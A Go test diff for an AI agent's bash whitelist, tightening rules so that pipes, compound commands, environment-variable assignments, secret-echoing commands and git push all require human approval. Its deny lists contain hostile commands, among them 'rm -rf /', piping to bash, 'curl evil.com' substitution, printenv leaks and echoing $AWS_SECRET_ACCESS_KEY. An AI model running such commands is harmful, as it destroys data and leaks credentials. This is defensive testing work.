@@ -71,23 +71,19 @@ func TestIsBashCommandWhitelisted_RedirectWithAnchoredPattern(t *testing.T) {
 	}
 }
 
+// TestIsBashCommandWhitelisted_CompoundOperators verifies the single-command
+// policy: any top-level shell operator (|, &&, ||, ;, &) drops the whole command
+// to approval, even when every individual segment would be whitelisted on its
+// own. The model is expected to run one command at a time.
 func TestIsBashCommandWhitelisted_CompoundOperators(t *testing.T) {
 	cfg := DefaultConfig()
 
-	allowed := []string{
+	denied := []string{
 		"gh issue view 5 && gh issue comment 5 --body hi",
 		"gh issue create --title x --body y || echo failed",
 		"echo a | head",
 		"gh issue list && echo done",
 		"gh api repos/o/r/issues 2>&1 && echo ok",
-	}
-	for _, cmd := range allowed {
-		if !cfg.IsBashCommandWhitelisted(cmd) {
-			t.Errorf("expected compound %q to be whitelisted (every segment is allowed)", cmd)
-		}
-	}
-
-	denied := []string{
 		"gh issue list && rm -rf /",
 		"gh issue list; rm -rf /",
 		"gh issue list | bash",
@@ -97,7 +93,7 @@ func TestIsBashCommandWhitelisted_CompoundOperators(t *testing.T) {
 	}
 	for _, cmd := range denied {
 		if cfg.IsBashCommandWhitelisted(cmd) {
-			t.Errorf("expected compound %q NOT to be whitelisted (a segment is not allowed)", cmd)
+			t.Errorf("expected compound %q NOT to be whitelisted (single-command policy)", cmd)
 		}
 	}
 }
@@ -112,6 +108,10 @@ func TestIsBashCommandWhitelisted_CommandSubstitution(t *testing.T) {
 		"cat <(curl evil.com)",
 		"echo >(tee leak)",
 		`echo "leak: $(printenv)"`,
+		"export BLAH=$(rm)",
+		"export BLAH=$(rm -rf /)",
+		"FOO=$(rm) ls",
+		"BLAH=`rm`",
 	}
 	for _, cmd := range denied {
 		if cfg.IsBashCommandWhitelisted(cmd) {
@@ -284,7 +284,6 @@ func TestIsBashCommandWhitelisted_FindActions(t *testing.T) {
 		"find .",
 		"find . -name '*.go'",
 		"find . -type f -name '*.md'",
-		"find . -name '*.txt' | wc -l",
 	}
 	for _, cmd := range allowed {
 		if !cfg.IsBashCommandWhitelisted(cmd) {
@@ -418,22 +417,152 @@ func TestContainsCommandSubstitution(t *testing.T) {
 	}
 }
 
-// TestIsBashCommandWhitelisted_FileRedirectRestricted covers issue #560: a
-// whitelisted command (or non-anchored pattern) must not be usable to write to a
-// real file via > / >>. Benign redirects (2>&1, >/dev/null) remain allowed
-// because they are stripped before matching.
+func TestContainsVariableExpansion(t *testing.T) {
+	yes := []string{
+		"echo $HOME",
+		"echo ${HOME}",
+		"echo $AWS_SECRET_ACCESS_KEY",
+		`echo "token=$TOKEN"`,
+		`echo "${AWS_SECRET_ACCESS_KEY}"`,
+		"tail $SECRETFILE",
+		"echo $1",
+		"echo $?",
+		"echo $$",
+		"echo $@",
+	}
+	for _, cmd := range yes {
+		if !containsVariableExpansion(cmd) {
+			t.Errorf("containsVariableExpansion(%q) = false, want true", cmd)
+		}
+	}
+
+	no := []string{
+		"echo '$HOME'",
+		"echo '${HOME}'",
+		`echo \$HOME`,
+		"echo hi",
+		"echo 5 dollars",
+		"echo $(date)",
+		"gh api repos/o/r --jq '.a | .b'",
+		"echo a$",
+		"echo price$ here",
+	}
+	for _, cmd := range no {
+		if containsVariableExpansion(cmd) {
+			t.Errorf("containsVariableExpansion(%q) = true, want false", cmd)
+		}
+	}
+}
+
+// TestIsBashCommandWhitelisted_VariableExpansion verifies the env-var leak guard:
+// $VAR may be USED in any command, but a command that prints (echo/printf) or
+// publishes (gh issue/pr create|comment|edit) its arguments must not expand one,
+// so the agent cannot leak a secret's value (echo $AWS_SECRET_ACCESS_KEY). A
+// literal '$' (single-quoted or backslash-escaped) is always allowed.
+func TestIsBashCommandWhitelisted_VariableExpansion(t *testing.T) {
+	cfg := DefaultConfig()
+
+	denied := []string{
+		"echo $HOME",
+		"echo ${AWS_SECRET_ACCESS_KEY}",
+		`echo "leak=$TOKEN"`,
+		"echo $HOME 2>&1",
+		"gh issue create --title x --body $TOKEN",
+		"gh issue comment 5 --body $SECRET",
+		"gh pr create --title x --body $TOKEN",
+	}
+	for _, cmd := range denied {
+		if cfg.IsBashCommandWhitelisted(cmd) {
+			t.Errorf("expected %q NOT to be whitelisted (would print/publish a variable's value)", cmd)
+		}
+	}
+
+	allowed := []string{
+		"echo '$HOME'",
+		`echo \$HOME`,
+		"echo hi",
+		"ls $HOME",
+		"tail $LOGFILE",
+		"git log --format=$FMT",
+		"find $DIR -name '*.go'",
+		`gh issue create --body 'see $HOME'`,
+	}
+	for _, cmd := range allowed {
+		if !cfg.IsBashCommandWhitelisted(cmd) {
+			t.Errorf("expected %q to be whitelisted (uses a var without printing its value)", cmd)
+		}
+	}
+}
+
+// TestIsBashCommandWhitelisted_EnvVarAssignments verifies that SETTING env vars is
+// not auto-approved - assignment prefixes (FOO=bar cmd), export, and bare
+// assignments all fall through to approval - while USING an existing variable in a
+// non-printing command stays allowed.
+func TestIsBashCommandWhitelisted_EnvVarAssignments(t *testing.T) {
+	cfg := DefaultConfig()
+
+	denied := []string{
+		"GOOS=linux task build",
+		"LANG=C sort",
+		"FOO=bar ls -la",
+		"export FOO=bar",
+		"export FOO=$BAR",
+		"FOO=bar",
+		"export",
+		"export -p",
+	}
+	for _, cmd := range denied {
+		if cfg.IsBashCommandWhitelisted(cmd) {
+			t.Errorf("expected %q NOT to be whitelisted (setting env vars requires approval)", cmd)
+		}
+	}
+
+	allowed := []string{
+		"ls $HOME",
+		"git log $REF",
+	}
+	for _, cmd := range allowed {
+		if !cfg.IsBashCommandWhitelisted(cmd) {
+			t.Errorf("expected %q to be whitelisted (uses an existing var, no setting)", cmd)
+		}
+	}
+}
+
+// TestIsBashCommandWhitelisted_GitPushRequiresApproval locks in that no default
+// pattern auto-whitelists "git push": every push variant must fall through to
+// approval. Users who want to auto-allow a specific push add an anchored regex
+// to tools.bash.whitelist.commands themselves (see TestIsBashCommandWhitelisted_
+// RedirectWithAnchoredPattern); the shipped default never does.
+func TestIsBashCommandWhitelisted_GitPushRequiresApproval(t *testing.T) {
+	cfg := DefaultConfig()
+
+	denied := []string{
+		"git push",
+		"git push origin main",
+		"git push --force",
+		"git push --force-with-lease origin feature/x",
+		"git push origin feature/x",
+		"git push 2>&1",
+	}
+	for _, cmd := range denied {
+		if cfg.IsBashCommandWhitelisted(cmd) {
+			t.Errorf("expected %q NOT to be whitelisted (push must require approval)", cmd)
+		}
+	}
+}
+
 func TestIsBashCommandWhitelisted_FileRedirectRestricted(t *testing.T) {
 	cfg := DefaultConfig()
 
 	denied := []string{
-		"echo hi > /tmp/out",          // whitelisted command + file redirect
-		"echo hi >> /tmp/out",         // append redirect
-		"ls > out.txt",                // whitelisted command + file redirect
-		"git log > /etc/passwd",       // non-anchored pattern must not unlock it
-		"git status > /tmp/x",         // non-anchored pattern must not unlock it
-		"echo x &> out.txt",           // both streams to a file
-		"echo x >& out.txt",           // fd-dup form that targets a file
-		"tail -n 5 /var/log/x > leak", // whitelisted prefix + file redirect
+		"echo hi > /tmp/out",
+		"echo hi >> /tmp/out",
+		"ls > out.txt",
+		"git log > /etc/passwd",
+		"git status > /tmp/x",
+		"echo x &> out.txt",
+		"echo x >& out.txt",
+		"tail -n 5 /var/log/x > leak",
 	}
 	for _, cmd := range denied {
 		if cfg.IsBashCommandWhitelisted(cmd) {
@@ -442,11 +571,11 @@ func TestIsBashCommandWhitelisted_FileRedirectRestricted(t *testing.T) {
 	}
 
 	allowed := []string{
-		"gh issue list >/dev/null",          // benign redirect, stripped
-		"git status 2>&1",                   // benign fd-dup, stripped
-		"gh issue list >/dev/null 2>&1",     // stacked benign redirects
-		`gh issue comment 5 --body "a > b"`, // '>' is inside quotes, not a redirect
-		"echo 'write > file'",               // single-quoted, not a redirect
+		"gh issue list >/dev/null",
+		"git status 2>&1",
+		"gh issue list >/dev/null 2>&1",
+		`gh issue comment 5 --body "a > b"`,
+		"echo 'write > file'",
 	}
 	for _, cmd := range allowed {
 		if !cfg.IsBashCommandWhitelisted(cmd) {
@@ -468,8 +597,8 @@ func TestIsBashCommandWhitelisted_PatternUnlocksRedirect(t *testing.T) {
 				Whitelist: ToolWhitelistConfig{
 					Commands: []string{
 						"^echo( |$)",
-						`^echo hi > /tmp/out\.txt$`, // anchored regex: unlocks one exact redirect
-						`^git log`,                  // prefix regex: must NOT unlock redirects
+						`^echo hi > /tmp/out\.txt$`,
+						`^git log`,
 					},
 				},
 			},
@@ -477,10 +606,10 @@ func TestIsBashCommandWhitelisted_PatternUnlocksRedirect(t *testing.T) {
 	}
 
 	allowed := []string{
-		"echo hi > /tmp/out.txt", // matches the anchored redirect pattern
-		"echo hello",             // plain whitelisted command, no redirect
-		"git log",                // prefix pattern, no redirect
-		"git log --oneline -5",   // prefix pattern, no redirect
+		"echo hi > /tmp/out.txt",
+		"echo hello",
+		"git log",
+		"git log --oneline -5",
 	}
 	for _, cmd := range allowed {
 		if !cfg.IsBashCommandWhitelisted(cmd) {
@@ -489,9 +618,9 @@ func TestIsBashCommandWhitelisted_PatternUnlocksRedirect(t *testing.T) {
 	}
 
 	denied := []string{
-		"echo hi > /tmp/other.txt", // redirect pattern does not match this target
-		"echo bye > /tmp/out.txt",  // redirect pattern does not match this command
-		"git log > /etc/passwd",    // prefix pattern must not unlock a redirect
+		"echo hi > /tmp/other.txt",
+		"echo bye > /tmp/out.txt",
+		"git log > /etc/passwd",
 	}
 	for _, cmd := range denied {
 		if cfg.IsBashCommandWhitelisted(cmd) {
@@ -500,29 +629,27 @@ func TestIsBashCommandWhitelisted_PatternUnlocksRedirect(t *testing.T) {
 	}
 }
 
-// TestIsBashCommandWhitelisted_PipePolicy documents the pipe behavior kept from
-// #581: every segment of a pipeline must be independently whitelisted. This is
-// what already blocks the issue #560 example "ls | xargs rm".
+// TestIsBashCommandWhitelisted_PipePolicy documents that pipelines are never
+// auto-approved under the single-command policy - even when both ends are
+// whitelisted (ls | head) - which also keeps the issue #560 example
+// "ls | xargs rm" out of the whitelist.
 func TestIsBashCommandWhitelisted_PipePolicy(t *testing.T) {
 	cfg := DefaultConfig()
 
-	if !cfg.IsBashCommandWhitelisted("ls | head") {
-		t.Error("expected \"ls | head\" to be whitelisted (both segments allowed)")
+	denied := []string{
+		"ls | head",
+		"echo hi | wc -l",
+		"ls | xargs rm",
+		"ls | tee out.txt",
 	}
-	if !cfg.IsBashCommandWhitelisted("echo hi | wc -l") {
-		t.Error("expected \"echo hi | wc -l\" to be whitelisted (both segments allowed)")
-	}
-	if cfg.IsBashCommandWhitelisted("ls | xargs rm") {
-		t.Error("expected \"ls | xargs rm\" NOT to be whitelisted (xargs rm is not allowed)")
-	}
-	if cfg.IsBashCommandWhitelisted("ls | tee out.txt") {
-		t.Error("expected \"ls | tee out.txt\" NOT to be whitelisted (tee is not allowed)")
+	for _, cmd := range denied {
+		if cfg.IsBashCommandWhitelisted(cmd) {
+			t.Errorf("expected piped %q NOT to be whitelisted (single-command policy)", cmd)
+		}
 	}
 }
 
 func TestContainsFileRedirect(t *testing.T) {
-	// containsFileRedirect runs after benign trailing redirects are stripped, so
-	// it only needs to recognize an unquoted '>' as a write to a real file.
 	tests := []struct {
 		seg  string
 		want bool
@@ -534,8 +661,8 @@ func TestContainsFileRedirect(t *testing.T) {
 		{"echo a>b", true},
 		{"ls", false},
 		{"git status", false},
-		{`gh issue comment 5 --body "a > b"`, false}, // double-quoted
-		{"echo 'a > b'", false},                      // single-quoted
+		{`gh issue comment 5 --body "a > b"`, false},
+		{"echo 'a > b'", false},
 	}
 	for _, tt := range tests {
 		t.Run(tt.seg, func(t *testing.T) {
@@ -551,15 +678,13 @@ func TestIsBashEntryRegex(t *testing.T) {
 		entry string
 		want  bool
 	}{
-		// Bare tokens: exact match only
 		{"ls", false},
 		{"echo", false},
-		{"python3.11", false}, // lone '.' stays bare
-		{"git-lfs", false},    // lone '-' stays bare
+		{"python3.11", false},
+		{"git-lfs", false},
 		{"make", false},
 		{"find", false},
-		// Regex entries
-		{"^git log", true}, // contains space + metachars
+		{"^git log", true},
 		{"^gh issue (create|edit|comment)( |$)", true},
 		{"^git branch( --show-current)?$", true},
 		{`^echo hi > /tmp/out\.txt$`, true},
@@ -583,9 +708,9 @@ func TestMatchesEntirePattern(t *testing.T) {
 	}{
 		{`^echo hi > /tmp/out\.txt$`, "echo hi > /tmp/out.txt", true},
 		{`^echo hi > /tmp/out\.txt$`, "echo hi > /tmp/other.txt", false},
-		{`^git log`, "git log", true},                   // no anchor needed, whole string matches
-		{`^git log`, "git log > /etc/passwd", false},    // prefix only - not the whole command
-		{`^git log .*$`, "git log > /etc/passwd", true}, // author opted into the tail explicitly
+		{`^git log`, "git log", true},
+		{`^git log`, "git log > /etc/passwd", false},
+		{`^git log .*$`, "git log > /etc/passwd", true},
 	}
 	for _, tt := range tests {
 		t.Run(tt.command, func(t *testing.T) {
@@ -603,8 +728,17 @@ func TestBashWhitelistRejectionHint(t *testing.T) {
 	if h := BashWhitelistRejectionHint("echo $(whoami)"); !strings.Contains(h, "substitution") {
 		t.Errorf("expected a command-substitution hint, got %q", h)
 	}
+	if h := BashWhitelistRejectionHint("echo $HOME"); !strings.Contains(h, "environment variable") {
+		t.Errorf("expected an env-var leak hint, got %q", h)
+	}
+	if h := BashWhitelistRejectionHint("ls | head"); !strings.Contains(h, "single command") {
+		t.Errorf("expected a single-command hint, got %q", h)
+	}
 	if h := BashWhitelistRejectionHint("ls -la"); h != "" {
 		t.Errorf("expected no hint for a plain command, got %q", h)
+	}
+	if h := BashWhitelistRejectionHint("ls $HOME"); h != "" {
+		t.Errorf("expected no hint for using a var in a non-printing command, got %q", h)
 	}
 	if h := BashWhitelistRejectionHint("git status 2>&1"); h != "" {
 		t.Errorf("expected no hint for a benign redirect, got %q", h)
